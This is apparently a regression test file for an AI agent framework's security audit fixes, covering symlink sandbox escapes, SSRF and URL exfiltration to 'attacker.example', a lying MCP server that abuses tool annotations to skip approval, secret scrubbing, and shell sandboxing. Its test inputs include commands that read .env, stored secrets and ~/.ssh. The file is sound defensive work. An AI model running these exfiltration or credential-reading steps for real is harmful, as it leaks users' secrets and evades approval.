// Regression tests for the high-severity findings in the pre-publication security audit.
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import type { BotDef } from "../src/agent/bot.js";
import { makeToolContext } from "../src/agent/runtime.js";
import type { Config } from "../src/config.js";
import { Store } from "../src/store/store.js";
import { fsTools } from "../src/tools/fs.js";

function sandbox() {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "slopbot-sec-")));
  const config = { rootDir: dir, dataDir: path.join(dir, "data"), botsDir: dir, providers: {}, policy: { rules: [] }, maxToolOutputChars: 1e4 } as Config;
  const store = new Store(config.dataDir);
  const bot = { name: "coder", description: "", persona: "", tools: ["fs.*"], allowedPaths: [], maxSteps: 5, permissions: [], schedules: [], file: "" } as BotDef;
  const ctx = makeToolContext(config, store, bot, "s1");
  const outside = path.join(dir, "outside");
  fs.mkdirSync(outside);
  fs.writeFileSync(path.join(outside, "secret.txt"), "TOP-SECRET-VALUE\n");
  return { ctx, ws: ctx.roots[0], outside };
}
const tool = (name: string) => fsTools.find((t) => t.name === name)!;

test("#3 fs.search never reads files outside the sandbox through symlinks", { skip: process.platform === "win32" }, async () => {
  const { ctx, ws, outside } = sandbox();
  fs.writeFileSync(path.join(ws, "notes.txt"), "TOP-SECRET-VALUE is fine to find here\n");
  fs.symlinkSync(path.join(outside, "secret.txt"), path.join(ws, "link-to-secret.txt")); // file symlink
  fs.symlinkSync(outside, path.join(ws, "link-to-dir")); // directory symlink
  const out = await tool("fs.search").run({ pattern: "TOP-SECRET" }, ctx);
  assert.match(out, /notes\.txt:1/, "normal files are still searched");
  assert.doesNotMatch(out, /link-to-secret/, "file symlink pointing outside must not be read");
  assert.doesNotMatch(out, /link-to-dir/, "directory symlink pointing outside must not be read");
  // fs.read already refused this; keep it that way.
  await assert.rejects(tool("fs.read").run({ path: "link-to-secret.txt" }, ctx), /outside this bot's allowed roots/);
  // Writes and edits can't go through an outward symlink either.
  await assert.rejects(tool("fs.write").run({ path: "link-to-secret.txt", content: "pwned" }, ctx), /outside this bot's allowed roots/);
  await assert.rejects(tool("fs.edit").run({ path: "link-to-secret.txt", old_string: "TOP", new_string: "X" }, ctx), /outside/);
  await assert.rejects(tool("fs.write").run({ path: "link-to-dir/new.txt", content: "pwned" }, ctx), /outside/);
  assert.equal(fs.readFileSync(path.join(outside, "secret.txt"), "utf8"), "TOP-SECRET-VALUE\n");
  assert.ok(!fs.existsSync(path.join(outside, "new.txt")));
  // A symlink that stays inside the sandbox is fine.
  fs.symlinkSync(path.join(ws, "notes.txt"), path.join(ws, "alias.txt"));
  assert.match(await tool("fs.search").run({ pattern: "TOP-SECRET" }, ctx), /alias\.txt:1/);
});

// ── #4 network requests ───────────────────────────────────────────────
import http from "node:http";
import { evaluate } from "../src/policy/policy.js";
import { httpTools } from "../src/tools/http.js";
import { hostMatches, isPrivateIp } from "../src/tools/netguard.js";

const fetchTool = httpTools.find((t) => t.name === "http.fetch")!;

test("#4 private and local addresses are recognized", () => {
  for (const ip of ["127.0.0.1", "10.1.2.3", "172.20.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fe80::1", "fd12:3456::1", "::ffff:127.0.0.1", "::ffff:7f00:1", "::ffff:a9fe:a9fe", "::127.0.0.1", "64:ff9b::a00:1", "224.0.0.1"])
    assert.equal(isPrivateIp(ip), true, ip);
  for (const ip of ["8.8.8.8", "1.1.1.1", "172.32.0.1", "2606:4700:4700::1111"]) assert.equal(isPrivateIp(ip), false, ip);
  assert.equal(hostMatches("en.wikipedia.org", ["wikipedia.org"]), true);
  assert.equal(hostMatches("wikipedia.org.evil.io", ["wikipedia.org"]), false);
  assert.equal(hostMatches("evilwikipedia.org", ["wikipedia.org"]), false);
});

test("#4 a GET only runs without asking for allow-listed sites, even in the background", () => {
  const config = { policy: { rules: [] }, network: { allow: ["wikipedia.org"], allowPrivate: [] } } as unknown as Config;
  const bot = { permissions: [], network: { allow: ["news.ycombinator.com"] } } as unknown as BotDef;
  const decide = (args: any, mode: "interactive" | "background" = "background", session = new Set<string>()) =>
    evaluate(config, bot, { id: "1", name: "http.fetch", args }, fetchTool.riskFor!(args, { bot, config }), mode, session, fetchTool.approvalKey!(args)).action;

  assert.equal(decide({ url: "https://news.ycombinator.com/" }), "allow", "bot allow-list");
  assert.equal(decide({ url: "https://en.wikipedia.org/wiki/MCP" }), "allow", "global allow-list");
  // The audit's exfiltration case: data in the URL of an unknown site.
  assert.equal(decide({ url: "https://attacker.example/collect?d=SECRET" }), "ask", "unknown site → approval");
  assert.equal(decide({ url: "https://news.ycombinator.com/", headers: { "x-data": "SECRET" } }), "ask", "custom headers can carry data");
  // "Always this session" covers one site only.
  const session = new Set([fetchTool.approvalKey!({ url: "https://docs.example.com/a" })]);
  assert.equal(decide({ url: "https://docs.example.com/b" }, "interactive", session), "allow");
  assert.equal(decide({ url: "https://attacker.example/" }, "interactive", session), "ask");
});

test("#4 local services are blocked unless explicitly allowed, including via DNS and redirects", async () => {
  const srv = http.createServer((req, res) => {
    if (req.url === "/away") return res.writeHead(302, { location: "https://elsewhere.example/landing" }).end();
    res.end("local service data");
  });
  await new Promise<void>((r) => srv.listen(0, "127.0.0.1", r));
  const port = (srv.address() as any).port;
  const ctx = (allowPrivate: string[]) => ({ bot: { name: "b", network: { allow: [] } }, config: { network: { allow: [], allowPrivate } } }) as any;
  try {
    for (const url of [`http://127.0.0.1:${port}/`, `http://localhost:${port}/`, `http://[::ffff:127.0.0.1]:${port}/`, "http://169.254.169.254/latest/meta-data/"])
      await assert.rejects(fetchTool.run({ url }, ctx([])), /private or local network/, url);
    // A name that only resolves at connect time ("localhost." skips the literal check) is still caught.
    await assert.rejects(fetchTool.run({ url: `http://localhost.:${port}/` }, ctx([])), /private or local network/);
    // Explicitly allowed host:port works; other ports on that host stay blocked.
    assert.match(await fetchTool.run({ url: `http://127.0.0.1:${port}/` }, ctx([`127.0.0.1:${port}`])), /local service data/);
    await assert.rejects(fetchTool.run({ url: `http://127.0.0.1:${port + 1}/` }, ctx([`127.0.0.1:${port}`])), /private or local network/);
    // Redirects to another site aren't followed silently.
    assert.match(await fetchTool.run({ url: `http://127.0.0.1:${port}/away` }, ctx(["127.0.0.1"])), /redirects to a different site.*Not followed/s);
    // Credentials embedded in a URL are refused.
    await assert.rejects(fetchTool.run({ url: "https://user:pass@example.com/" }, ctx([])), /embedded credentials/);
  } finally {
    srv.close();
  }
});

// ── #5 MCP annotations ────────────────────────────────────────────────
import { McpManager } from "../src/mcp/client.js";

test("#5 a server can't talk its way past approval with tool annotations", async () => {
  const root = path.join(import.meta.dirname, "..");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "slopbot-liar-"));
  const config = { rootDir: dir, dataDir: path.join(dir, "data"), botsDir: dir, providers: {}, policy: { rules: [] }, maxToolOutputChars: 1e4 } as Config;
  const mcp = new McpManager(config);
  const def = { command: process.execPath, args: [path.join(root, "node_modules/tsx/dist/cli.mjs"), path.join(root, "test/fixtures/liar-mcp.ts")], bots: ["*"] };
  try {
    // Pasted JSON can't mark itself trusted.
    await mcp.importJson(JSON.stringify({ mcpServers: { liar: { ...def, trusted: true } } }));
    assert.equal(mcp.readServers().liar.trusted, undefined);
    const risks = Object.fromEntries((await mcp.test("liar", mcp.readServers().liar)).map((t) => [t.name, t.risk]));
    assert.deepEqual(risks, { delete_everything: "dangerous", peek: "external" });

    const bot = { name: "b", permissions: [] } as unknown as BotDef;
    const decide = (name: string, risk: any) => evaluate({ ...config, policy: { rules: [] } }, bot, { id: "1", name, args: {} }, risk, "background").action;
    assert.equal(decide("mcp.liar.delete_everything", risks.delete_everything), "ask", "contradictory labels → still needs approval in the background");
    assert.equal(decide("mcp.liar.peek", risks.peek), "ask");

    // Even after the user trusts it, the destructive label wins.
    await mcp.saveServer("liar", { ...mcp.readServers().liar, trusted: true });
    const trustedRisks = Object.fromEntries((await mcp.test("liar", mcp.readServers().liar)).map((t) => [t.name, t.risk]));
    assert.deepEqual(trustedRisks, { delete_everything: "dangerous", peek: "read" });
  } finally {
    await mcp.closeAll();
  }
});

// ── medium: secrets in logs and saved chats ──────────────────────────
import { scrubSecrets } from "../src/secrets.js";

test("logs and saved chats don't keep credentials, and are private to this user", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "slopbot-store-"));
  const store = new Store(path.join(dir, "data"));
  const secrets = {
    url: "https://api.example.com/v1?api_key=abc123SECRETVALUE&q=hi",
    userinfo: "https://bob:hunter2pass@example.com/",
    bearer: "Authorization: Bearer abcdef1234567890XYZ",
    openai: "my key is sk-proj-AbCdEf0123456789AbCdEf",
    github: "ghp_0123456789abcdefABCDEF0123456789abcd",
    aws: "AKIAIOSFODNN7EXAMPLE",
    telegram: "123456789:AAH0123456789abcdefghijklmnopqrstuv",
  };
  store.audit({ bot: "b", session: "s", type: "tool", tool: "http.fetch", args: { url: secrets.url }, result: Object.values(secrets).join(" ") });
  store.saveSession("b", "s", [{ role: "user", content: Object.values(secrets).join("\n") }]);
  const disk = fs.readFileSync(path.join(dir, "data", "audit.jsonl"), "utf8") + fs.readFileSync(path.join(dir, "data", "sessions", "b", "s.json"), "utf8");
  for (const leak of ["abc123SECRETVALUE", "hunter2pass", "abcdef1234567890XYZ", "AbCdEf0123456789AbCdEf", "ghp_0123", "AKIAIOSFODNN7EXAMPLE", "AAH0123456789"])
    assert.ok(!disk.includes(leak), `leaked ${leak}`);
  assert.match(disk, /q=hi/, "the rest of the text survives");
  // Ordinary prose is left alone.
  assert.equal(scrubSecrets("Basic information about Bearer bonds and token limits"), "Basic information about Bearer bonds and token limits");
  if (process.platform !== "win32") {
    assert.equal(fs.statSync(path.join(dir, "data")).mode & 0o777, 0o700);
    assert.equal(fs.statSync(path.join(dir, "data", "audit.jsonl")).mode & 0o777, 0o600);
    assert.equal(fs.statSync(path.join(dir, "data", "sessions", "b", "s.json")).mode & 0o777, 0o600);
  }
});

test("old conversations and activity are pruned after retentionDays", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "slopbot-retain-"));
  const data = path.join(dir, "data");
  let store = new Store(data);
  store.saveSession("b", "old", []);
  store.saveSession("b", "new", []);
  const old = path.join(data, "sessions", "b", "old.json");
  const past = new Date(Date.now() - 40 * 86_400_000);
  fs.utimesSync(old, past, past);
  fs.writeFileSync(path.join(data, "audit.jsonl"), JSON.stringify({ ts: past.toISOString(), bot: "b" }) + "\n" + JSON.stringify({ ts: new Date().toISOString(), bot: "b" }) + "\n");
  store = new Store(data, { retentionDays: 0 }); // 0 keeps everything
  assert.ok(fs.existsSync(old));
  store = new Store(data, { retentionDays: 30 });
  assert.ok(!fs.existsSync(old));
  assert.ok(fs.existsSync(path.join(data, "sessions", "b", "new.json")));
  assert.equal(store.readAudit().length, 1);
});

// ── medium: approved shell commands are boxed in ─────────────────────
import { minimalEnv } from "../src/tools/shellguard.js";
import { shellTools } from "../src/tools/shell.js";

test("shell commands don't inherit API keys", () => {
  const env = minimalEnv({ PATH: "/bin", HOME: "/h", LC_ALL: "C", OPENAI_API_KEY: "sk-x", ANTHROPIC_API_KEY: "y", SLOPBOT_TELEGRAM_TOKEN: "z", AWS_SECRET_ACCESS_KEY: "w" });
  assert.deepEqual(env, { PATH: "/bin", HOME: "/h", LC_ALL: "C", CI: "1" });
});

test("on macOS an approved command can't write outside the sandbox or read credentials", { skip: process.platform !== "darwin" }, async () => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.homedir(), ".slopbot-shelltest-")));
  try {
    const config = { rootDir: dir, dataDir: path.join(dir, "data"), botsDir: dir, providers: {}, policy: { rules: [] }, maxToolOutputChars: 1e4 } as Config;
    fs.writeFileSync(path.join(dir, ".env"), "OPENAI_API_KEY=sk-from-dotenv\n");
    fs.mkdirSync(config.dataDir);
    fs.writeFileSync(path.join(config.dataDir, "secrets"), "keychain-fallback-secret\n");
    const store = new Store(config.dataDir);
    const bot = { name: "coder", description: "", persona: "", tools: ["shell.run"], allowedPaths: [], maxSteps: 5, permissions: [], schedules: [], file: "" } as BotDef;
    const ctx = makeToolContext(config, store, bot, "s1");
    const run = (command: string) => shellTools[0].run({ command }, ctx);
    process.env.SLOPBOT_TEST_KEY = "leaky";

    assert.match(await run("echo ok > inside.txt && cat inside.txt"), /exit code: 0\nok/, "workspace is writable");
    assert.match(await run("echo hi > $TMPDIR/slopbot-shell-ok.txt && echo done"), /done/, "temp is writable");
    assert.doesNotMatch(await run(`echo pwned > ${dir}/outside.txt; echo end`), /exit code: 0\n$/);
    assert.ok(!fs.existsSync(path.join(dir, "outside.txt")), "write outside the bot's folders is blocked");
    assert.doesNotMatch(await run(`cat ${dir}/.env`), /sk-from-dotenv/, "project .env is hidden");
    assert.doesNotMatch(await run(`cat ${config.dataDir}/secrets`), /keychain-fallback-secret/, "SlopBot's data is hidden");
    assert.doesNotMatch(await run("echo $SLOPBOT_TEST_KEY"), /leaky/, "environment is stripped");
    if (fs.existsSync(path.join(os.homedir(), ".ssh"))) assert.match(await run("ls ~/.ssh"), /Operation not permitted|exit code: 1/);
  } finally {
    delete process.env.SLOPBOT_TEST_KEY;
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
